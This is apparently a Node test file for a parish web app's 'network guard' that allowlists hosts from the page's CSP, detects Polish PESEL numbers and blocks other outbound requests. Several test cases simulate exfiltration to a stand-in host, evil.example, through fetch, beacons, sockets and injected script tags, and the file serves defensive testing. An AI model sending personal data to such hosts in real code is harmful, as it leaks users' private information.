// Testy v2.15.17: Strażnik Sieci (js/straznik-sieci.js) — lista dozwolonych adresów, wykrywanie PESEL, instalacja w „oknie”.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
const czytaj = (p) => fs.readFileSync(new URL('../' + p, import.meta.url), 'utf8');
const G = require('../js/straznik-sieci.js');
const ORIGIN = 'https://parafia.github.io';
const csp = (f) => /Content-Security-Policy" content="([^"]+)"/.exec(czytaj(f))[1];
const pol = (f) => G.utworzPolityke({ csp: csp(f), origin: ORIGIN });
const HOST_SB = /SUPABASE_URL = 'https:\/\/([^']+)'/.exec(czytaj('js/supabase-client.js'))[1];

test('PESEL: poprawna suma kontrolna i data → wykrywany; zła suma, zły miesiąc, UUID i znaczniki czasu → nie', () => {
    assert.equal(G.pesel_poprawny('44051401359'), true);
    assert.equal(G.pesel_poprawny('44051401358'), false);          // zła suma kontrolna
    assert.equal(G.pesel_poprawny('08271234567'), false);
    assert.equal(G.pesel_poprawny('4405140135'), false);           // 10 cyfr
    assert.equal(G.policzPesele('{"p":"44051401359"}'), 1);
    assert.equal(G.policzPesele('x 44051401359 y 44051401359'), 2);
    assert.equal(G.policzPesele('ts 1731600000000 uuid 123e4567-e89b-12d3-a456-426614174000 id 12345678901'), 0);
    assert.equal(G.policzPesele('a44051401359'), 0);               // część dłuższego ciągu alfanumerycznego
});

test('polityka z CSP: index.html bez hostów zewnętrznych; app i kiosk z dokładnymi hostami', () => {
    assert.equal(pol('index.html').hosty.size, 0);
    for (const f of ['app.html', 'kiosk.html']) { const h = pol(f).hosty; assert.ok(h.has(HOST_SB), f); assert.ok(h.has('cdn.jsdelivr.net'), f); }
    assert.ok(pol('app.html').hosty.has('tessdata.projectnaptha.com'));
    assert.ok(!pol('kiosk.html').hosty.has('unpkg.com'));          // Kiosk nie ma zapasowych CDN
});

test('adresy: własne i lokalne tak; obce hosty, http, adres z loginem, nietypowy port nie', () => {
    const p = pol('app.html');
    const o = (u, m) => G.ocenAdres(u, m, p, ORIGIN + '/app.html');
    assert.equal(o('js/kiosk.js?v=2.15.17').dozwolone, true);
    assert.equal(o('blob:https://parafia.github.io/abc').dozwolone, true);
    assert.equal(o('data:text/plain,x').dozwolone, true);
    assert.equal(o('https://evil.example/x?d=1').powod, 'host_poza_lista');
    assert.equal(o('http://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js').powod, 'nieszyfrowane');
    assert.equal(o('https://u:p@cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js').powod, 'dane_w_adresie');
    assert.equal(o('https://cdn.jsdelivr.net:8443/npm/jsqr@1.4.0/dist/jsQR.js').powod, 'port');
    assert.equal(o('ftp://x/y').dozwolone, false);
    assert.equal(o('http://').dozwolone, false);   // nieprawidłowy adres bezwzględny
});

test('Supabase: tylko /rest, /functions/asystent, /auth, /realtime; storage i inne ścieżki zablokowane; przekroczona długość zablokowana', () => {
    const p = pol('kiosk.html'); const b = 'https://' + HOST_SB;
    const o = (u, m) => G.ocenAdres(u, m, p, ORIGIN);
    assert.equal(o(b + '/rest/v1/rpc/zapisz_obecnosc', 'POST').dozwolone, true);
    assert.equal(o(b + '/rest/v1/ministranci?select=id&id=in.(1,2,3)').dozwolone, true);
    assert.equal(o(b + '/functions/v1/asystent', 'POST').dozwolone, true);
    assert.equal(o(b + '/functions/v1/inna', 'POST').powod, 'sciezka_poza_lista');
    assert.equal(o(b + '/storage/v1/object/public/x').powod, 'sciezka_poza_lista');
    assert.equal(o('wss://' + HOST_SB + '/realtime/v1/websocket?apikey=k').dozwolone, true);
    assert.equal(o(b + '/rest/v1/x?q=' + 'a'.repeat(7000)).powod, 'adres_zbyt_dlugi');
});

test('CDN: tylko znane pakiety, GET/HEAD, bez query; zakodowane dane w ścieżce odrzucone', () => {
    const p = pol('app.html'); const o = (u, m) => G.ocenAdres(u, m, p, ORIGIN);
    assert.equal(o('https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2').dozwolone, true);
    assert.equal(o('https://cdn.jsdelivr.net/npm/tesseract.js@5.1.1/dist/tesseract.min.js').dozwolone, true);
    assert.equal(o('https://cdn.jsdelivr.net/npm/tesseract.js-core@v5.1.1/tesseract-core-simd-lstm.wasm.js').dozwolone, true);
    assert.equal(o('https://cdn.jsdelivr.net/npm/6a6f6e4b6f77616c736b69@1').powod, 'sciezka_poza_lista');
    assert.equal(o('https://cdn.jsdelivr.net/gh/atakujacy/repo@1/x.js').powod, 'sciezka_poza_lista');
    assert.equal(o('https://cdn.jsdelivr.net/npm/jspdf@2.5.1/dist/jspdf.umd.min.js?d=dane').powod, 'query_w_adresie_cdn');
    assert.equal(o('https://cdn.jsdelivr.net/npm/jspdf@2.5.1/dist/jspdf.umd.min.js', 'POST').powod, 'metoda_dla_cdn');
    assert.equal(o('https://unpkg.com/evil@1/x.js').powod, 'sciezka_poza_lista');
    assert.equal(o('https://tessdata.projectnaptha.com/4.0.0/eng.traineddata.gz').dozwolone, true);
    assert.equal(o('https://tessdata.projectnaptha.com/4.0.0/../x').dozwolone, false);
});

test('zgodność z kodem: KAŻDY zewnętrzny adres użyty w js/*.js i stronach jest dozwolony przez strażnika (żeby niczego nie zepsuł)', () => {
    const pliki = ['js/app.part4.js', 'js/app.part9.js', 'js/skaner-kamery.js', 'js/supabase-client.js'];
    const znalezione = [];
    for (const f of pliki) for (const m of czytaj(f).matchAll(/'(https:\/\/[^'\s]+)'/g)) znalezione.push([f, m[1]]);
    for (const f of ['app.html', 'kiosk.html']) for (const m of czytaj(f).matchAll(/<script src="(https:\/\/[^"]+)"/g)) znalezione.push([f, m[1]]);
    assert.ok(znalezione.length >= 8, 'powinno być co najmniej 8 adresów zewnętrznych, jest ' + znalezione.length);
    const polityki = { 'app.html': pol('app.html'), 'kiosk.html': pol('kiosk.html') };
    for (const [f, u] of znalezione) {
        if (u.includes('//www.w3.org')) continue;
        const strona = f === 'kiosk.html' || f === 'js/skaner-kamery.js' ? 'kiosk.html' : 'app.html';
        let w = G.ocenAdres(u, 'GET', polityki[strona], ORIGIN);
        if (f === 'js/supabase-client.js') w = G.ocenAdres(u + '/rest/v1/', 'GET', polityki[strona], ORIGIN);   // SUPABASE_URL to baza adresu
        assert.equal(w.dozwolone, true, f + ' → ' + u + ' → ' + w.powod);
    }
    // pliki Tesseract ładowane przez bibliotekę (domyślne adresy v5.1.1)
    for (const u of ['https://cdn.jsdelivr.net/npm/tesseract.js@v5.1.1/dist/worker.min.js', 'https://tessdata.projectnaptha.com/4.0.0/eng.traineddata.gz']) assert.equal(G.ocenAdres(u, 'GET', polityki['app.html'], ORIGIN).dozwolone, true, u);
});

test('ocenZadanie: PESEL w treści lub adresie blokuje także zapytanie do Supabase; treść do CDN zawsze zablokowana; zwykły RPC przechodzi', () => {
    const p = pol('kiosk.html'); const b = 'https://' + HOST_SB + '/rest/v1/rpc/x';
    assert.equal(G.ocenZadanie({ url: b, metoda: 'POST', cialo: JSON.stringify({ p_kod: 'MIN-001', p_pin: '1234', p_kiedy: '2026-11-14T10:00:00Z' }) }, p, ORIGIN).dozwolone, true);
    assert.equal(G.ocenZadanie({ url: b, metoda: 'POST', cialo: '{"x":"44051401359"}' }, p, ORIGIN).powod, 'pesel_w_tresci');
    assert.equal(G.ocenZadanie({ url: b + '?pesel=44051401359', metoda: 'GET' }, p, ORIGIN).powod, 'pesel_w_tresci');
    assert.equal(G.ocenZadanie({ url: 'https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js', metoda: 'GET', cialo: 'dane' }, p, ORIGIN).powod, 'tresc_do_hosta_zewnetrznego');
    const fd = new FormData(); fd.append('a', 'x 44051401359 y');
    assert.equal(G.ocenZadanie({ url: b, metoda: 'POST', cialo: fd }, p, ORIGIN).powod, 'pesel_w_tresci');
    assert.equal(G.ocenZadanie({ url: b, metoda: 'POST', cialo: new URLSearchParams({ a: '44051401359' }) }, p, ORIGIN).powod, 'pesel_w_tresci');
});

// ------------------------- instalacja w atrapie okna -------------------------
function atrapa(strona = 'kiosk.html') {
    const wywolania = { fetch: [], xhr: [], beacon: [], ws: [], open: [] };
    class XHR { open(m, u) { wywolania.xhr.push(['open', m, u]); } send(b) { wywolania.xhr.push(['send', b]); } }
    class WS { constructor(u) { this.url = u; wywolania.ws.push(u); } }
    class ES { constructor(u) { this.url = u; } }
    class Element { setAttribute(n, v) { this['atrybut_' + n] = v; } }
    class Script extends Element { constructor() { super(); this.tagName = 'SCRIPT'; this.zdarzenia = []; } get src() { return this._s; } set src(v) { this._s = v; } dispatchEvent(e) { this.zdarzenia.push(e.type); } }
    const ostrzezenia = []; const powiadomienia = [];
    const okno = {
        fetch: async (u, i) => { wywolania.fetch.push([String(u), i]); return { ok: true }; },
        XMLHttpRequest: XHR, WebSocket: WS, EventSource: ES, Element, HTMLScriptElement: Script, Event: class { constructor(t) { this.type = t; } },
        navigator: { sendBeacon: (u, d) => { wywolania.beacon.push([u, d]); return true; } },
        open: (u) => { wywolania.open.push(u); return { okno: true }; },
        console: { warn: (...a) => ostrzezenia.push(a.join(' ')) },
        powiadom: (rodzaj, tekst) => powiadomienia.push([rodzaj, tekst]), t: (k) => k
    };
    let czas = 1000;
    const straznik = G.zainstaluj(okno, { csp: csp(strona), origin: ORIGIN, baza: ORIGIN + '/kiosk.html', czas: () => czas });
    return { okno, straznik, wywolania, ostrzezenia, powiadomienia, Script, Element, ustawCzas: (c) => { czas = c; } };
}

test('instalacja: fetch przepuszcza dozwolone i odrzuca niedozwolone (TypeError ze znacznikiem), bez wywołania oryginału', async () => {
    const a = atrapa();
    await a.okno.fetch('https://' + HOST_SB + '/rest/v1/rpc/zapisz_obecnosc', { method: 'POST', body: '{"p_kod":"MIN-001"}' });
    await a.okno.fetch('js/wersja.js?sprawdz=123');
    assert.equal(a.wywolania.fetch.length, 2);
    await assert.rejects(() => a.okno.fetch('https://evil.example/zbierz?d=Jan', { method: 'POST', body: 'Jan Kowalski' }), (e) => e instanceof TypeError && e.straznikSieci === true && e.powod === 'host_poza_lista');
    await assert.rejects(() => a.okno.fetch('https://' + HOST_SB + '/rest/v1/rpc/x', { method: 'POST', body: '{"d":"44051401359"}' }), (e) => e.powod === 'pesel_w_tresci');
    assert.equal(a.wywolania.fetch.length, 2, 'zablokowane żądania nie dotarły do oryginalnego fetch');
});

test('instalacja: dziennik blokad zawiera tylko host, powód i czas — bez adresu, query i treści', async () => {
    const a = atrapa();
    await assert.rejects(() => a.okno.fetch('https://evil.example/x?imie=Jan&nazwisko=Kowalski', { method: 'POST', body: 'tajne' }));
    const d = a.straznik.dziennik(); assert.equal(d.length, 1);
    assert.deepEqual(Object.keys(d[0]).sort(), ['host', 'kiedy', 'metoda', 'powod']);
    const wszystko = JSON.stringify(d) + a.ostrzezenia.join(' ');
    assert.ok(!/Jan|Kowalski|tajne|imie=/.test(wszystko), wszystko);
});

test('instalacja: XMLHttpRequest, sendBeacon, WebSocket, EventSource, window.open', () => {
    const a = atrapa(); const { okno } = a;
    const x = new okno.XMLHttpRequest();
    assert.throws(() => x.open('POST', 'https://evil.example/c'), (e) => e.name === 'NetworkError' && e.straznikSieci);
    x.open('GET', 'js/kiosk.js'); x.send(null);
    assert.throws(() => { const y = new okno.XMLHttpRequest(); y.open('POST', 'https://' + HOST_SB + '/rest/v1/rpc/x'); y.send('{"p":"44051401359"}'); }, (e) => e.straznikSieci);
    assert.equal(okno.navigator.sendBeacon('https://evil.example/b', 'dane'), false);
    assert.equal(okno.navigator.sendBeacon('https://' + HOST_SB + '/rest/v1/rpc/log', '{}'), true);
    assert.throws(() => new okno.WebSocket('wss://evil.example/ws'), (e) => e.straznikSieci);
    const ws = new okno.WebSocket('wss://' + HOST_SB + '/realtime/v1/websocket?apikey=k'); assert.ok(ws.url.includes('realtime'));
    assert.throws(() => new okno.EventSource('https://evil.example/e'), (e) => e.straznikSieci);
    assert.equal(okno.open('https://evil.example/'), null);
    assert.deepEqual(okno.open('', '_blank'), { okno: true });
    assert.deepEqual(okno.open('blob:https://parafia.github.io/x'), { okno: true });
});

test('instalacja: dynamiczny <script src> — obcy adres nie jest ustawiany i dostaje zdarzenie error; dozwolony przechodzi; setAttribute też', async () => {
    const a = atrapa(); const s = new a.Script();
    s.src = 'https://evil.example/x.js'; assert.equal(s._s, undefined);
    s.src = 'https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js'; assert.equal(s._s, 'https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js');
    s.src = 'js/pomoc.js?v=2.15.17'; assert.equal(s._s, 'js/pomoc.js?v=2.15.17');
    const t = new a.Script(); t.setAttribute('src', 'https://evil.example/y.js'); assert.equal(t.atrybut_src, undefined);
    t.setAttribute('src', 'js/start.js'); assert.equal(t.atrybut_src, 'js/start.js');
    const e = new a.Element(); e.tagName = 'DIV'; e.setAttribute('src', 'https://evil.example/img.png'); assert.equal(e.atrybut_src, 'https://evil.example/img.png');   // inne elementy: CSP
    await new Promise((r) => setTimeout(r, 5)); assert.ok(s.zdarzenia.includes('error'));
});

test('instalacja: opakowania są zamrożone (przypisanie nie podmienia), powiadomienie raz na minutę', async () => {
    const a = atrapa();
    assert.throws(() => { a.okno.fetch = async () => ({}); }, TypeError);
    assert.throws(() => { a.okno.navigator.sendBeacon = () => true; }, TypeError);
    await assert.rejects(() => a.okno.fetch('https://evil.example/1')); await assert.rejects(() => a.okno.fetch('https://evil.example/2'));
    assert.equal(a.powiadomienia.length, 1);
    a.ustawCzas(1000 + 61000); await assert.rejects(() => a.okno.fetch('https://evil.example/3'));
    assert.equal(a.powiadomienia.length, 2); assert.equal(a.straznik.liczbaBlokad(), 3);
    for (const n of ['fetch', 'xhr', 'beacon', 'websocket', 'eventsource', 'open', 'script']) assert.ok(a.straznik.instalacje.includes(n), n);
});

test('strony: strażnik ładowany zaraz po ochronie, przed jakimkolwiek innym skryptem i przed klientem Supabase; jest w pamięci service workera', () => {
    for (const f of ['index.html', 'app.html', 'kiosk.html']) {
        const h = czytaj(f); const kolej = [...h.matchAll(/<script src="([^"]+)"/g)].map(m => m[1].split('?')[0]);
        assert.equal(kolej[0], 'js/ochrona-start.js', f); assert.equal(kolej[1], 'js/straznik-sieci.js', f);
        if (f !== 'index.html') assert.ok(kolej.indexOf('js/straznik-sieci.js') < kolej.indexOf('https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2'), f + ': przed biblioteką z CDN');
    }
    assert.match(czytaj('sw.js'), /'js\/straznik-sieci\.js'/);
});
